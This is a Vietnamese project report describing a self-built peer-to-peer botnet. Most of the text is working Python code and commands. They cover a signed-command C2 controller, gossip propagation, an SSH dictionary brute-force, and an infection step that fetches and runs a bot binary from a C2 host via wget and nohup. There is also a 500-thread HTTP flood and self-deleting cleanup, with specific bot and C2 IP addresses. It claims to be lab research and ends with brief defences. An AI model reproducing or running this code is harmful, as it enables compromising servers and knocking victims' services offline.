
---

## 1. Mô hình kiến trúc Botnet P2P

### 1.1. Tổng quan kiến trúc

Hệ thống botnet được xây dựng theo mô hình **P2P (Peer-to-Peer)** kết hợp C2 Push. Owner gửi lệnh đến 1 bot bất kỳ (seed), bot đó tự động lan truyền lệnh đến toàn mạng qua **Gossip Protocol**. Bot được tổ chức dưới dạng **Python package** (`bot/`) với các module tách biệt rõ ràng, dễ bảo trì.

**Luồng hoạt động chính:**
```
Owner (botmaster.py) → UDP Push → Seed Bot → Gossip Protocol → Toàn mạng bot
```

### 1.2. Sơ đồ kiến trúc tổng thể

```
┌──────────────────────────────────────────────────────────────────────┐
│                         ATTACKER SIDE                                │
│                                                                      │
│                    ┌──────────────────┐                               │
│                    │     OWNER        │                               │
│                    │  botmaster.py    │                               │
│                    └────────┬─────────┘                               │
│                             │ UDP C2_PUSH (signed Ed25519)           │
│              ┌──────────────┼──────────────┐                         │
│              │              │              │                         │
│              ▼              ▼              ▼                         │
│         ┌─────────┐   ┌─────────┐   ┌─────────┐                     │
│         │  Bot 1  │◄─►│  Bot 2  │◄─►│  Bot 3  │                     │
│         │ Zombie  │   │ Zombie  │   │ Zombie  │   P2P Gossip        │
│         │ .160.87 │◄─►│ .209.10 │◄─►│ .222.108│   (UDP :9999)       │
│         └────┬────┘   └────┬────┘   └────┬────┘                     │
│              │              │              │                         │
│              └──────────────┼──────────────┘                         │
│                             │  HTTP Flood                            │
│                             ▼                                        │
│                    ┌──────────────────┐                               │
│                    │     VICTIM       │                               │
│                    └──────────────────┘                               │
└──────────────────────────────────────────────────────────────────────┘
```

### 1.3. Cấu trúc source code

Bot được tổ chức thành **Python package** với cấu trúc module hóa:

```
botnet/
├── bot.py              ← Wrapper: gọi bot/__main__.py
├── botmaster.py        ← C2 Controller (Owner dùng)
├── crypto_utils.py     ← Tool sinh keypair Ed25519
├── bot/
│   ├── __init__.py
│   ├── __main__.py     ← Entry point: khởi tạo threads
│   ├── config.py       ← Cấu hình + biến toàn cục chia sẻ
│   ├── crypto.py       ← Xác thực chữ ký Ed25519
│   ├── p2p.py          ← P2P listener, gossip, peer discovery
│   ├── attack.py       ← HTTP Flood (500 threads)
│   └── commands.py     ← Xử lý lệnh: DDOS, STOP, KILL
└── scripts/
    └── deploy.sh
```

### 1.4. Thành phần hệ thống

#### a) Bot Master — `botmaster.py`

| Thuộc tính | Chi tiết |
|------------|----------|
| **Giao thức** | UDP |
| **Port điều khiển** | 9999 |
| **Chức năng** | Gửi lệnh (DDOS, STOP, KILL), kiểm tra bot (PING), brute-force SSH, lây nhiễm |
| **Xác thực lệnh** | Ký chữ ký số Ed25519 bằng private key |

**Các lệnh hỗ trợ:**
```
python3 botmaster.py ddos   <zombie_ip> <target> <port> <duration>
python3 botmaster.py stop   <zombie_ip>
python3 botmaster.py kill   <zombie_ip>
python3 botmaster.py brute  <target_ip> [port]
python3 botmaster.py check  <ip|all>
```

**Code minh họa — Ký lệnh và gửi C2_PUSH:**

```python
# botmaster.py — sign()
def sign(cmd):
    """Ký lệnh bằng Ed25519 private key."""
    body = {k: v for k, v in cmd.items() if k != "signature"}
    msg = json.dumps(body, sort_keys=True).encode()
    sk = SigningKey(bytes.fromhex(PRIVATE_KEY))
    sig = sk.sign(msg).signature
    cmd["signature"] = base64.b64encode(sig).decode()
    return cmd

# botmaster.py — push()
def push(zombie_ip, cmd):
    """Gửi lệnh đã ký đến zombie qua UDP."""
    version = int(time.time())
    signed = sign(cmd)
    msg = json.dumps({"type": "C2_PUSH", "version": version, "payload": signed}).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(msg, (zombie_ip, P2P_PORT))
    sock.close()
```

#### b) Bot (Zombie Client) — package `bot/`

| Thuộc tính | Chi tiết |
|------------|----------|
| **Port P2P** | UDP 9999 |
| **Giao thức** | UDP (nhận lệnh P2P + C2_PUSH) |
| **Định danh** | `BOT_ID` = MD5(hostname + MAC), 12 ký tự đầu |
| **Ngôn ngữ** | Python 3, đóng gói binary bằng PyInstaller |
| **Thư viện** | `pynacl` (Ed25519 verify), `socket`, `threading`, `queue` |

**Bảng module chi tiết:**

| Module | File | Hàm chính | Chức năng |
|--------|------|-----------|-----------|
| **Config** | `config.py` | globals | Cấu hình P2P_PORT, BOOTSTRAP_PEERS, PUBLIC_KEY, shared state (CMD_QUEUE, CMD_REF, PEER_STATUS, STOP_FLAG...) |
| **Entry** | `__main__.py` | `main()` | Khởi tạo: start thread `p2p_listener`, chạy `command_processor` trên main thread |
| **P2P** | `p2p.py` | `p2p_listener()` | Bind UDP :9999, xử lý PING/PONG, GOSSIP, C2_PUSH, auto peer discovery |
| **P2P** | `p2p.py` | `gossip_to_all()` | Lan truyền lệnh đến tất cả peer (trừ nguồn gửi) |
| **P2P** | `p2p.py` | `handle_new_command()` | Verify chữ ký + version check → queue lệnh + gossip |
| **Crypto** | `crypto.py` | `verify_command()` | Xác thực chữ ký Ed25519 bằng public key hardcode |
| **Attack** | `attack.py` | `http_flood()` | HTTP GET Flood với 500 worker threads |
| **Commands** | `commands.py` | `command_processor()` | Main loop blocking trên CMD_QUEUE, xử lý DDOS/STOP/KILL |
| **Commands** | `commands.py` | `stop_all_attacks()` | Set STOP_FLAG, join attack threads |
| **Commands** | `commands.py` | `cleanup_and_exit()` | Xóa file + exit (lệnh KILL) |

**Cấu trúc dữ liệu (shared state) trong `config.py`:**

```python
# bot/config.py
P2P_PORT = 9999
MASTER_PUBLIC_KEY = "235664217084a35a56e8f9a32fd9215607366e54d9c94d10ee21e33dd4638592"
REQUIRE_SIGNATURE = True

BOOTSTRAP_PEERS = [
    ("209.97.160.87", P2P_PORT),
    ("167.71.209.10", P2P_PORT),
    ("152.42.222.108", P2P_PORT),
]

CMD_QUEUE   = queue.Queue()                  # Hàng đợi lệnh thread-safe
CMD_REF     = {"version": 0, "cmd": {"type": "WAIT"}}  # Lệnh hiện tại + version
CMD_LOCK    = threading.Lock()               # Mutex bảo vệ CMD_REF
ATTACK_THREADS = []                          # Danh sách thread attack đang chạy
STOP_FLAG   = threading.Event()              # Cờ dừng attack
PEER_STATUS = {ip: {"port": port} for ip, port in BOOTSTRAP_PEERS}  # Bảng peer
BOT_ID      = hashlib.md5(f"{platform.node()}-{uuid.getnode()}".encode()).hexdigest()[:12]
```

**Sơ đồ thread trong Bot:**

```
main()  (__main__.py)
    │
    ├── Thread: p2p_listener(CMD_QUEUE, CMD_REF)    ← Lắng nghe UDP :9999
    │       │
    │       └── Thread: gossip_to_all(...)           ← Khi nhận lệnh mới → gossip
    │
    └── command_processor()                          ← Main loop (blocking)
            │
            ├── DDOS  → Thread: http_flood()         ← 500 worker threads
            ├── STOP  → stop_all_attacks()
            └── KILL  → cleanup_and_exit()
```

### 1.5. Giao thức truyền thông P2P

Bot giao tiếp qua **UDP** trên port **9999**. Tất cả message dạng **JSON** encode sang bytes.

#### a) Gossip Protocol (Lan truyền lệnh)

**Mục đích:** Chỉ cần owner gửi lệnh đến **1 bot (seed)**, bot đó tự động lan truyền đến toàn mạng.

**Cấu trúc message GOSSIP:**
```json
{
    "type": "GOSSIP",
    "version": 1740000000,
    "payload": {
        "type": "DDOS",
        "target": "206.189.39.182",
        "port": "80",
        "duration": "60",
        "signature": "base64_encoded_ed25519_signature..."
    },
    "from": "a1b2c3d4e5f6"
}
```

**Code minh họa — Xử lý lệnh mới + gossip:**

```python
# bot/p2p.py — handle_new_command()
def handle_new_command(cmd_queue, cmd_ref, payload, version, source):
    with CMD_LOCK:
        if version > cmd_ref["version"] and verify_command(payload):
            cmd_queue.put(payload)
            cmd_ref["version"] = version
            cmd_ref["cmd"] = payload
            threading.Thread(
                target=gossip_to_all,
                args=({"version": version, "cmd": payload}, source),
                daemon=True
            ).start()
            return True
    return False

# bot/p2p.py — gossip_to_all()
def gossip_to_all(cmd_ref, skip_ip=None):
    if cmd_ref["cmd"].get("type") == "WAIT":
        return
    msg = json.dumps({
        "type": "GOSSIP",
        "version": cmd_ref["version"],
        "payload": cmd_ref["cmd"],
        "from": BOT_ID,
    }).encode()
    targets = [(ip, st) for ip, st in PEER_STATUS.items() if ip != skip_ip]
    random.shuffle(targets)
    for ip, st in targets:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(msg, (ip, st.get("port", P2P_PORT)))
        sock.close()
```

**Quy trình xử lý khi nhận GOSSIP/C2_PUSH:**

```
Nhận UDP packet
    │
    ▼
Parse JSON → lấy payload, version
    │
    ▼
version > CMD_REF["version"] ?
    │
    ├── KHÔNG → BỎ QUA (chống replay, chống loop)
    │
    └── CÓ → verify_command(payload) → Ed25519 verify
            │
            ├── KHÔNG HỢP LỆ → BỎ QUA
            │
            └── HỢP LỆ
                    │
                    ▼
                Acquire CMD_LOCK
                Cập nhật CMD_REF + CMD_QUEUE.put(payload)
                Release CMD_LOCK
                    │
                    ▼
                Spawn thread: gossip_to_all() → gửi đến TẤT CẢ peer (trừ nguồn)
```

**Ví dụ lan truyền 3 bot:**

```
T+0:  Owner → Bot 1 (C2_PUSH, v=100)
      Bot 1: version 0 < 100 → chấp nhận → gossip → Bot 2, Bot 3

T+1:  Bot 2 nhận v=100 → chấp nhận → gossip → Bot 3
      Bot 3 nhận v=100 → chấp nhận → gossip → Bot 2

T+2:  Bot 2 nhận v=100 lần 2 → version 100 = 100 → BỎ QUA
      → Mạng hội tụ, không lan truyền thêm
```

**Đặc điểm kỹ thuật:**
- **Version = timestamp** (`int(time.time())`): luôn tăng theo thời gian
- **Chống loop**: bỏ qua nguồn gửi khi gossip + so sánh version
- **Thread-safe**: `CMD_LOCK` bảo vệ `CMD_REF` khi nhiều peer gửi cùng lúc
- **Fire-and-forget**: gửi UDP không cần ACK

#### b) PING/PONG (Health Check)

```json
// Request
{"type": "PING"}

// Response
{"type": "PONG"}
```

**Code minh họa — P2P Listener xử lý PING:**

```python
# bot/p2p.py — p2p_listener() (trích)
while True:
    data, addr = sock.recvfrom(4096)
    msg = json.loads(data.decode())
    mtype = msg.get("type")

    if mtype == "PING":
        sock.sendto(json.dumps({"type": "PONG"}).encode(), addr)

    elif mtype in ("GOSSIP", "C2_PUSH"):
        payload = msg.get("payload", {})
        version = msg.get("version", 0)
        handle_new_command(cmd_queue, cmd_ref, payload, version, addr[0])

    # Auto peer discovery
    peer_ip = addr[0]
    if peer_ip not in PEER_STATUS:
        PEER_STATUS[peer_ip] = {"port": P2P_PORT}
```

Botmaster dùng PING/PONG để kiểm tra bot sống hay chết:
```python
# botmaster.py — check_bot()
def check_bot(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(json.dumps({"type": "PING"}).encode(), (ip, P2P_PORT))
    data, _ = sock.recvfrom(1024)
    if json.loads(data.decode()).get("type") == "PONG":
        print(f"  {ip}   ALIVE")
```

#### c) Peer Discovery (Khám phá peer tự động)

Ngoài `BOOTSTRAP_PEERS` hardcode sẵn, bot tự động phát hiện peer mới qua **implicit discovery**: khi nhận UDP packet từ IP chưa biết → thêm vào `PEER_STATUS`.

```python
# Trong p2p_listener(), cuối mỗi lần xử lý message:
peer_ip = addr[0]
if peer_ip not in PEER_STATUS:
    PEER_STATUS[peer_ip] = {"port": P2P_PORT}
```

→ Mạng tự mở rộng khi có bot mới tham gia.

### 1.6. Cơ chế bảo mật

#### a) Xác thực lệnh bằng chữ ký số Ed25519

**Vấn đề:** Trong mạng P2P, ai cũng có thể gửi UDP packet giả mạo lệnh.

**Giải pháp:** Ed25519 digital signature — Owner ký bằng private key, Bot verify bằng public key.

```
OWNER (ký):                              BOT (xác thực):
cmd = {"type":"DDOS",...}                 sig = base64_decode(cmd["signature"])
body = json.dumps(cmd, sort_keys=True)    body = {k:v for k,v if k != "signature"}
signature = Ed25519_Sign(PRIVATE, body)   msg = json.dumps(body, sort_keys=True)
cmd["signature"] = base64(signature)      Ed25519_Verify(PUBLIC, msg, sig) → T/F
```

**Code minh họa — Verify trên bot:**

```python
# bot/crypto.py
def verify_command(cmd_dict):
    if not REQUIRE_SIGNATURE:
        return True
    sig_b64 = cmd_dict.get("signature")
    if not sig_b64:
        return False
    sig = base64.b64decode(sig_b64)
    body = {k: v for k, v in cmd_dict.items() if k != "signature"}
    msg = json.dumps(body, sort_keys=True).encode()
    VerifyKey(bytes.fromhex(MASTER_PUBLIC_KEY)).verify(msg, sig)
    return True
```

**Đặc điểm:**
- Private key (32 bytes) chỉ owner giữ — KHÔNG có trên bot
- Public key (32 bytes) hardcode trên mỗi bot — chỉ dùng để verify
- Thay đổi 1 bit trong lệnh → chữ ký invalid

#### b) Version Control (Chống replay attack)

- Mỗi lệnh có `version = int(time.time())` (Unix timestamp)
- Bot chỉ chấp nhận `version > CMD_REF["version"]`
- Timestamp luôn tăng → lệnh cũ không bao giờ có version cao hơn
- Kết hợp Ed25519: không thể sửa version mà không phá chữ ký

#### c) Single Instance Protection

Bot kiểm tra port 9999 khi khởi động. Nếu đã bị chiếm → thoát ngay:

```python
# bot/p2p.py — p2p_listener()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    sock.bind(("0.0.0.0", P2P_PORT))
except OSError:
    print(f"[P2P] Port {P2P_PORT} in use → another instance running, exiting")
    os._exit(0)
```

**Bảng tổng hợp bảo mật:**

| Cơ chế | Chống lại | Cách thức |
|--------|-----------|-----------|
| **Ed25519 Signature** | Command injection, MITM | Ký private key → verify public key |
| **Version Control** | Replay attack | Timestamp version, chỉ nhận version lớn hơn |
| **Single Instance** | Port conflict, duplicate | Bind port 9999, thoát nếu bị chiếm |
| **Peer Discovery** | Network partition | Auto track IP mới từ incoming packets |

---

## 2. Xây dựng mô hình tấn công SSH Botnet

### 2.1. Danh sách thiết bị

| STT | Vai trò | IP | Mô tả |
|-----|---------|-----|-------|
| 1 | **C2 / File host** | 209.97.166.150 | Host file bot binary qua HTTP :80 |
| 2 | **Bot/Zombie 1** | 209.97.160.87 | Chạy bot, tham gia mạng P2P |
| 3 | **Bot/Zombie 2** | 167.71.209.10 | Chạy bot, tham gia mạng P2P |
| 4 | **Bot/Zombie 3** | 152.42.222.108 | Chạy bot, tham gia mạng P2P |
| 5 | **Victim** | Tùy chỉnh | Web server bị tấn công HTTP Flood |
| 6 | **Máy Owner** | Tùy chỉnh | Chạy `botmaster.py` để quản lý |

### 2.2. Tấn công Brute-Force SSH (Dictionary Attack)

Brute-force SSH được thực hiện từ **botmaster.py** (phía Owner):

```bash
python3 botmaster.py brute 209.97.160.87
```

**Code minh họa — SSH brute-force + lây nhiễm:**

```python
# botmaster.py — ssh_brute_force()
def ssh_brute_force(ip, port=22):
    # Kiểm tra port mở
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    if s.connect_ex((ip, port)) != 0:
        return None     # Port đóng
    s.close()

    # Thử từng tổ hợp username/password
    for user in USERNAMES:
        for pw in PASSWORDS:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                c.connect(ip, port=port, username=user, password=pw, timeout=3)
                return (user, pw, c)    # Thành công!
            except paramiko.AuthenticationException:
                c.close()
                continue

# botmaster.py — infect()
def infect(ip, user, pw, ssh_client):
    cmd = (
        "cd /tmp && "
        f"wget -q http://{C2_IP}/bot -O bot 2>/dev/null && "
        "chmod +x bot && "
        "nohup ./bot >/dev/null 2>&1 &"
    )
    ssh_client.exec_command(cmd, timeout=60)
```

**Quy trình:**

```
┌─────────────────────────────────────────────┐
│         QUY TRÌNH BRUTE-FORCE SSH           │
├─────────────────────────────────────────────┤
│  1. Check port 22 mở (connect_ex)          │
│         ├── Đóng → bỏ qua                  │
│         └── Mở → tiếp                      │
│                                             │
│  2. Thử từng (user, password)              │
│     USERNAMES × PASSWORDS tổ hợp           │
│         ├── AuthException → thử tiếp       │
│         ├── Timeout → thử tiếp             │
│         └── Thành công → lây nhiễm!        │
│                                             │
│  3. Lây nhiễm qua SSH:                     │
│     wget bot binary từ C2 → chmod +x       │
│     → nohup chạy nền                       │
│     → Bot khởi động, join mạng P2P         │
└─────────────────────────────────────────────┘
```

### 2.3. Tấn công DDoS (HTTP Flood)

#### 2.3.1. Gửi lệnh từ Owner

```bash
python3 botmaster.py ddos 209.97.160.87 <victim_ip> 80 60
```

#### 2.3.2. Cơ chế tấn công

```
Owner gửi lệnh:
    sign(cmd) → C2_PUSH → Seed Bot
        │
        ▼
    Seed Bot verify → chấp nhận → CMD_QUEUE
        │
        ├── command_processor() → http_flood() → 500 threads
        │
        └── gossip_to_all() → Bot 2, Bot 3
                │
                ├── Bot 2 verify → 500 threads
                └── Bot 3 verify → 500 threads

    Tổng: 3 bot × 500 threads = 1500 threads đồng thời
```

**Code minh họa — Command Processor:**

```python
# bot/commands.py
def command_processor():
    while True:
        cmd = CMD_QUEUE.get()       # Block cho đến khi có lệnh
        ct = cmd.get("type")

        if ct == "DDOS":
            stop_all_attacks()      # Dừng attack cũ
            t = threading.Thread(
                target=http_flood,
                args=(cmd["target"], int(cmd["port"]), int(cmd["duration"]), STOP_FLAG),
                daemon=True,
            )
            t.start()
            ATTACK_THREADS.append(t)

        elif ct == "STOP":
            stop_all_attacks()

        elif ct == "KILL":
            cleanup_and_exit()
```

**Code minh họa — HTTP Flood:**

```python
# bot/attack.py
def http_flood(target_ip, target_port, duration, stop_flag):
    end = time.time() + duration
    sent = [0]
    paths = ["/", "/index.html"]

    def worker():
        while time.time() < end and not stop_flag.is_set():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            try:
                s.connect((target_ip, target_port))
                req = (
                    f"GET {random.choice(paths)} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    "User-Agent: Mozilla/5.0\r\n"
                    "Connection: close\r\n\r\n"
                )
                s.send(req.encode())
                s.recv(1)
                sent[0] += 1
            except:
                pass
            finally:
                s.close()

    threads = []
    for _ in range(500):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
```

**Code minh họa — Stop + Kill:**

```python
# bot/commands.py
def stop_all_attacks():
    STOP_FLAG.set()
    for t in ATTACK_THREADS:
        if t.is_alive():
            t.join(timeout=2)
    ATTACK_THREADS.clear()
    STOP_FLAG.clear()

def cleanup_and_exit():
    STOP_FLAG.set()
    try:
        os.remove(os.path.abspath(sys.argv[0]))
    except:
        pass
    os._exit(0)
```

---

## 3. Kịch bản tấn công và thử nghiệm

### 3.1. Kịch bản 1: Brute-Force SSH và lây nhiễm Bot

#### Mục tiêu
- Thử nghiệm Dictionary Attack vào SSH trên các VPS
- Lây nhiễm bot lên máy nạn nhân sau khi brute-force thành công

#### Tiến hành

**Bước 1: Chuẩn bị**
- Build bot: `pyinstaller --onefile --name bot bot.py`
- Đặt HTTP server trên C2 (209.97.166.150) phục vụ file bot binary

**Bước 2: Brute-force từ Botmaster**
```bash
python3 botmaster.py brute 209.97.160.87
python3 botmaster.py brute 167.71.209.10
python3 botmaster.py brute 152.42.222.108
```

**Bước 3: Kết quả**
1. Tìm được credentials đúng → SSH thành công
2. Tải bot binary từ C2 qua wget
3. Bot khởi động → bind UDP 9999 → tham gia mạng P2P
4. Bot sẵn sàng nhận lệnh

#### Kết luận
Dictionary Attack SSH nguy hiểm với hệ thống dùng mật khẩu yếu. Phòng chống: SSH key authentication, fail2ban, disable root login, đổi port SSH.

### 3.2. Kịch bản 2: DDoS HTTP Flood qua mạng Botnet

#### Mục tiêu
- Thử nghiệm phối hợp tấn công DDoS từ nhiều bot
- Kiểm tra Gossip Protocol lan truyền lệnh

#### Tiến hành

**Bước 1: Kiểm tra botnet**
```bash
python3 botmaster.py check all
#   209.97.160.87   ALIVE
#   167.71.209.10   ALIVE
#   152.42.222.108  ALIVE
#   Result: 3/3 alive
```

**Bước 2: Gửi lệnh tấn công**
```bash
python3 botmaster.py ddos 209.97.160.87 <victim_ip> 80 60
```

**Bước 3: Luồng lan truyền**
1. Botmaster ký lệnh → UDP C2_PUSH → Bot 1
2. Bot 1 verify → chấp nhận → 500 threads HTTP Flood
3. Bot 1 gossip → Bot 2, Bot 3
4. Bot 2, Bot 3 verify → 500 threads mỗi bot
5. Tổng: **1500 threads** tấn công đồng thời

**Bước 4: Dừng tấn công**
```bash
python3 botmaster.py stop 209.97.160.87
# STOP gossip → tất cả bot dừng đồng loạt
```

#### Kết quả
- Lệnh truyền thành công qua Gossip Protocol
- 1500 threads HTTP Flood gây quá tải server mục tiêu
- Lệnh STOP dừng đồng loạt toàn mạng

#### Kết luận
HTTP Flood qua P2P botnet: chỉ cần gửi lệnh đến 1 bot → tự lan toàn mạng. Phòng chống: CDN/WAF (Cloudflare), rate limiting, connection limiting.

### 3.3. Kịch bản 3: Gossip Protocol và chống giả mạo lệnh

#### Mục tiêu
- Kiểm tra lệnh có chữ ký hợp lệ được lan truyền đúng
- Kiểm tra lệnh giả (không có chữ ký hoặc sai) bị reject

#### Tiến hành

**Test 1: Lệnh hợp lệ**
- Owner ký bằng private key → gửi C2_PUSH → Bot chấp nhận → gossip toàn mạng ✓

**Test 2: Lệnh giả mạo (không ký)**
```python
# Attacker gửi trực tiếp UDP
fake_cmd = {"type": "C2_PUSH", "version": 9999999999, "payload": {"type": "KILL"}}
sock.sendto(json.dumps(fake_cmd).encode(), (bot_ip, 9999))
# → Bot verify_command() → không có signature → return False → BỎ QUA ✓
```

**Test 3: Replay attack (gửi lại lệnh cũ)**
- Capture lệnh v=100, gửi lại sau khi bot đã nhận v=200
- Bot: version 100 < 200 → BỎ QUA ✓

#### Kết luận
Ed25519 + version control đảm bảo chỉ Owner mới điều khiển được botnet. Lệnh giả và replay attack đều bị reject.

---

## 4. Tổng kết

### 4.1. Bảng tổng hợp

| STT | Kịch bản | Kỹ thuật | Kết quả |
|-----|----------|----------|---------|
| 1 | Brute-Force SSH & Lây nhiễm | Dictionary Attack, SSH | Lây nhiễm VPS mật khẩu yếu |
| 2 | DDoS HTTP Flood | HTTP GET Flood, 1500 threads | Gây gián đoạn dịch vụ mục tiêu |
| 3 | Gossip & Anti-spoofing | Ed25519, Version control | Lệnh lan truyền an toàn, chống giả mạo |

### 4.2. Biện pháp phòng chống

| Mối đe dọa | Biện pháp |
|-------------|-----------|
| SSH Brute-Force | SSH key auth, fail2ban, đổi port, disable root |
| DDoS HTTP Flood | CDN/WAF, rate limiting, SYN cookies |
| P2P Botnet | Block UDP bất thường, IDS/IPS, network segmentation |

### 4.3. Kết luận chung

Dự án xây dựng mô hình botnet P2P module hóa với: lây nhiễm qua SSH brute-force (botmaster), tấn công DDoS HTTP Flood, giao tiếp P2P qua Gossip Protocol, xác thực Ed25519, và peer discovery tự động. Code được tổ chức thành package Python rõ ràng, mỗi module một trách nhiệm.

> ⚠️ **Lưu ý:** Toàn bộ dự án thực hiện trong môi trường lab có kiểm soát, phục vụ mục đích nghiên cứu và học tập. Sử dụng để tấn công hệ thống thực tế là **BẤT HỢP PHÁP**.
